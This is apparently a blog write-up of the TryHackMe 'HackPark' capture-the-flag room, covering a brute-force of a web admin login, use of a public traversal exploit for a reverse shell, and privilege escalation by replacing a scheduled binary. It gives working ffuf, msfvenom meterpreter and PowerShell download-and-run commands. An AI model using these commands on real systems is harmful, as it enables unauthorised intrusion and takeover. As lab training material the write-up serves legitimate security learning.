---
layout: post
description: Bruteforce a websites login with Hydra, identify and use a public exploit then escalate your privileges on this Windows machine!
title: THM Hackpark CTF Writeup
date: 2021-12-31 18:20
image: '/assets/img/posts/tryhackme-hackpark-ctf-writeup/parkbanner.jpg'
tags: [TryHackme Machines,ctf,pentesting,metasploit,mindows-privesc,bruteforce,remote-code-execution,directory-traversal,autorun-privesc]
featured: false
---

# ENUMERATION

Run Network Mapper (**nmap**) on Hackpark machine to discover opened ports and services.   

Full command : 
{% highlight bash %}
nmap -sV -sS -O -T4 -p- {machine IP} -Pn -oN {outputfile}
{% endhighlight %}

| Parameter              | Functionality                                          | 
|:-----------------------|:-------------------------------------------------------|
|-sV                     | Probe open ports to determine service/version info     |
|-sS                     | SYN, half TCP scan                                     |
|-O                      | Enable OS detection                                    |
|-T4                     | T{0-5} Set scan speed, higher is faster                |
|-p-                     | Scan all 65536 ports                                   |
|-Pn                     | Skip host discovery                                    |
|-oN                     | Write output to a file                                 |

Output of the scan:
{% highlight bash %}
# Nmap 7.92 scan initiated Thu Dec 30 14:40:55 2021 as: nmap -sV -sS -O -T4 -p- -Pn -oN hackpark.nmap 10.10.123.142
Nmap scan report for 10.10.123.142
Host is up (0.033s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft IIS httpd 8.5
3389/tcp open  ssl/ms-wbt-server?
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2012 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2012
Aggressive OS guesses: Microsoft Windows Server 2012 (89%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (89%), Microsoft Windows Server 2012 R2 (89%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Dec 30 14:43:54 2021 -- 1 IP address (1 host up) scanned in 179.18 seconds
{% endhighlight %}
Two ports opened:

## Port 3389 ssl/ms-wbt-server?
Port 3389 is running an [RDP](https://docs.microsoft.com/en-us/troubleshoot/windows-server/remote/understanding-remote-desktop-protocol) service.
However, it is not possible to exploit it since we do not have any information about the version of the service.

## Port 80 http Microsoft IIS httpd 8.5
[**Microsoft IIS**](https://en.wikipedia.org/wiki/Internet_Information_Services) web server is running on port 80.
![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/1.png)<br>
<br><br>Let us quickly check the [robots.txt](https://www.cloudflare.com/learning/bots/what-is-robots.txt/) to see if we can find something interesting.
![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/3.png)<br>
Nothing fancy here. Let us move on.
<br><br>[Dirsearch](https://github.com/maurosoria/dirsearch) can help us to enumerate subdirectories of the webserver.
Frameworks like **GoBuster** and **DirBuster** are also an option.
![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/2.png)<br>
The **/admin** directory might be interesting. However, the request to the directory gets redirected to a **.aspx** file 
which is probably a login form.
<br><br>![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/4.png)<br>
We will have to launch a [brute-force](https://www.fortinet.com/resources/cyberglossary/brute-force-attack) attack in order to
gain access to the backend panel.
<br><br>There is only one blog post published on the main page, and the author of it is the **ADMINISTRATOR**. 
So we can assume that the only user registered to the panel is the admin’s itself.
![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/5.png)<br>

# EXPLOITATON

## Brute-Forcing the Panel
In order to create continuous HTTP requests, we have to know how the HTTP request looks.
Launch the [**Burp Suite**](https://www.geeksforgeeks.org/what-is-burp-suite/) to examine the HTTP POST request sent 
when a login attempt occurs.
![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/6.png)_HTTP Post Request_<br>

There are three fields we have to make sure they are being sent with the HTTP request we will forge for this form.
1. [**application/x-www-form-urlencoded**](https://www.w3.org/TR/html401/interact/forms.html#h-17.13.4) header : Encoding type
2. **Username** : Username field
3. **Password** : Password Field

However, we need to include all the data section when posting the request. Otherwise we cannot get a healthy
response from the webserver.
I will use [**ffuf**](https://cybersecnerds.com/ffuf-everything-you-need-to-know/) to create POST requests toward the web server.
You can use any fuzzer tool like **THC Hydra**, **Burp Suite** or others. 
<br>Download [**SecLists**](https://github.com/danielmiessler/SecLists) repo with prepeared wordlists included.
Full command:
{% highlight bash %}
ffuf -w ~/Folders/pentest/SecLists/Passwords/probable-v2-top1575.txt:W1 -u "http://10.10.123.142/Account/login.aspx?ReturnURL=/admin/" -data " \_\_VIEWSTATE=RH2j6pTwkTpekqaGFxbyyqhRtNI0NqgguLfakdexSgccBsTJEspUlTZqAM4QgzNfGiTveKSyUR8zQcskqfuAHSnpcldHQ9xwsDFI7TPd9qleqBeLqjTEaf0uWEXMNHGHBar%2Fd4Tpi6vKNeoMnRSF9UgcpGiDPoDm%2BS2kBhsBJqJ47zLb&\_\_EVENTVALIDATION=iHNLSSqcnyAz7PNrH23YgFZ%2FinxPC1MSAVwjbKwwlbPU53tS7MftBm1t2tI37bKFNo1JvXCIgpZCsBc0Hy0zCU6jPybyZAob4Fm3Pmva7gRSUaDNTTb%2F3QgExGwRutGX4FnCQjvfJVEGodEZUU5p4vr8Xj6oe8MdxUtJM0CobBQGfLLs&ctl00%24MainContent%24LoginUser%24UserName=admin&ctl00%24MainContent%24LoginUser%24Password=W1&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in" -H "Content-Type: application/x-www-form-urlencoded" -fr "Login failed"
{% endhighlight %}

Where:

| Parameter              | Functionality                                          | 
|:-----------------------|:-------------------------------------------------------|
|-w                      | Dedicated wordlists                                    |
|-u                      | Target URL                                             |
|-data                   | Data which will be sent with the request               |
|-H                      | HTTP headers that will be sent with the request        |
|-fr                     | Regex which will be filtered out                       |

![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/8.png)_Starting the attack_<br>
Since the password is not strong enough, we have managed to crack it in a matter of seconds.
![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/10.png)_Logging in to the panel as the admin._
<br><br>
## Searching for Vulnerabilities
![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/11.png)_Checking the version of the framework_<br>
After logging in to the panel, under the About tab, we can see the version of the framework is 3.3.6
<br><br>After gathering the version information, we can check [Exploit-db](https://www.exploit-db.com/exploits/46353) to see
if there is any vulnerability on that version. I will use the **searchsploit** utility, the CLI version
of the Exploit-db.
![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/12.png)<br>
Multiple different exploits showed up. However, the first one is the 3.3.6 version specific. We are going to
use that. [Click to read more about _File Path, Directory Traversal_](https://portswigger.net/web-security/file-path-traversal).
<br><br>
## Hacking into the user's shell
Download the exploit, open up a text editor and change the highlighted parameters in the picture below with your THM IP and a free port.
![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/13.png)_Editing 46353.cs file_<br>
Rename the file as **PostView.ascx**.
<br><br>Navigate to the Content tab, then click on the blog post to access the editor.
Interact with the file manager to upload the exploit.
![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/13-1.png)_File manager icon_<br>
![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/14.png)_Uploading the exploit_<br>
<br>Make sure the post is saved to its' newer version.
![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/15.png)_Updating the blogpost_<br>
<br>Start a **netcat** listener on your machine with the port that is defined in the exploit.
![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/16.png)<br>
<br>To trigger the **PostView.ascx** file and get the reverse shell send a GET request to this
URL: **http://{MACHINE IP}/?theme=../../App_Data/files**<br>
![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/17.png)<br>
<br>Exploit worked like a charm, and we got our shell.
![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/18.png)<br>
<br>
## Upgrading to the Meterpreter
Since the shell we got is a poor Netcat shell, it would be better to get a **meterpreter** session
to facilitate our scans in the system.<br><br>
Let's create a meterpreter reverse shell binary with [msfvenom](https://www.offensive-security.com/metasploit-unleashed/msfvenom/). 
After successful creation, we need to upload this binary to the target machine. The shortest way to 
do it is to start a Python server.

{% highlight powershell %}
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST={THM IP} LPORT={SOME FREE PORT} -f exe revshell.exe
{% endhighlight %}

{% highlight python %}
sudo python -m http.server 80
{% endhighlight %}
![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/19.png)_Creating meterpreter backdoor and starting a Python server_<br>
<br><br>Download the backdoor to the target system with the following Powershell commands:
{% highlight powershell %}
cd "C:\Windows\Temp"
mkdir myfolder
cd myfolder
powershell -c "Invoke-WebRequest http://{THM IP}:{PORT}/{FILE_NAME} -OutFile .\revshell.exe"
{% endhighlight %}
![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/20.png)<br>
<br><br>We need to have a listener to accept incoming meterpreter connection.
{% highlight bash %}
msfconsole -q
handler -p windows/meterpreter/reverse_tcp -H {THM IP} -P {THE PORT DEFINED IN THE BACKDOOR}
{% endhighlight %}
![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/22.png)<br>
<br>Go back to the Netcat console, then run the backdoor as a background process with this command.
![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/21.png)<br>
<br>Excellent! We got the meterpreter session.
Right now, our control on the system is much more powerful than before.
![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/22-2.png)
<br><br>
## Privilege Escelation
After gaining access to the system as a low-level user, it is time to get administrator privileges to have much more 
permissions against the system. **PowerUp.ps1** is a program that facilitates fast checks in a windows machine to identify 
any misconfigurations and privilege escalation possibilities.
<br>[**Download PowerUp.ps1**](https://github.com/krygeNNN/krygeNNN.github.io/blob/main/assets/documents/tryhackme-steel-mountain-writeup/PowerUp.ps1)
<br>[**PowerSploit GitHub Repo**](https://github.com/PowerShellMafia/PowerSploit)
![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/23.png)_Uploading the PowerUp.ps1 Powershell script to the target system._<br>
<br><br>Since this is a Powershell script, we need to have a Powershell instead of a regular windows command prompt.
<br>-Load the Powershell module and summon it.
<br>-Import the script as a powershell module.
{% highlight powershell %}
Import-Module .\PowerUp.ps1
Invoke-AllChecks
{% endhighlight %}
![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/24.png)<br>
<br>**InvokeAllChecks** will diagnose any detectable vulnerabilities along with their descriptions.
![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/25.png)<br>
<br><br>One of the results is worth paying attention to. There is a Windows Scheduler service autoruns at the system logon. 
The problem is that everyone can modify all the files stored in the directory that contains 
W3Scheduler.exe. Since the scheduler is run with admin privileges, 
I can run my malicious executables with admin privileges by replacing the W3Scheduler.exe.
![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/26.png)<br>
<br>Some resources for autorun exploitation:
<br>- [Windows Privilege Escalation – Exploiting Autorun](https://steflan-security.com/windows-privilege-escalation-exploiting-autorun/)
<br>- [Privilege Escalation with Autoruns](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries)
<br><br>Let's check the the [**DACL(Discretionary Access Control List)**](https://networkencyclopedia.com/discretionary-access-control-list-dacl/) of the 'C:\Program Files (x86)\SystemScheduler' with [**icacls**](https://www.techtarget.com/searchwindowsserver/definition/icacls). 
![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/27.png)<br>
It is obvious that everyone have modify permission on this folder.
<br><br> Let's see what the directory contains along with W3Scheduler.exe
![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/28.png)<br>
<br><br>Replacing the W3Scheduler.exe with a backdoor would not work since it is a virtual box and once
rebooted, it will reset itself to factory settings. That is why we need to dig further to find out how
to walk around this.
<br><br>There is a log file in the directory, let's see what is inside.
![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/29.png)<br>
The scheduler executes a binary called Messages.exe every 23 seconds. 
![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/30.png)<br>
This binary is also in the modifiable directory. If we create a 
backdoor and put it where Message.exe sits, we can escalate our privileges.
<br><br>Once again, let's create a meterpreter reverse shell binary.
{% highlight powershell %}
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST={THM IP} LPORT={SOME FREE PORT} -f exe revshell.exe
{% endhighlight %}
Then start the python server.
{% highlight python %}
sudo python -m http.server 80
{% endhighlight %}
![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/31.png)<br>
<br><br>Start the multi handler listener.
![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/32.png)<br>
<br><br>Rename the executable as Messages.exe (I forgot it should be named Messages.exe when creating it). 
Then, replace the real binary with the malicious backdoor.
![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/33.png)<br>
<br><br>Sit back and wait for session to initialize.
![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/34.png)<br>
Voilà! We are the administrator now.
![](/assets/img/posts/tryhackme-hackpark-ctf-writeup/35.png)<br>
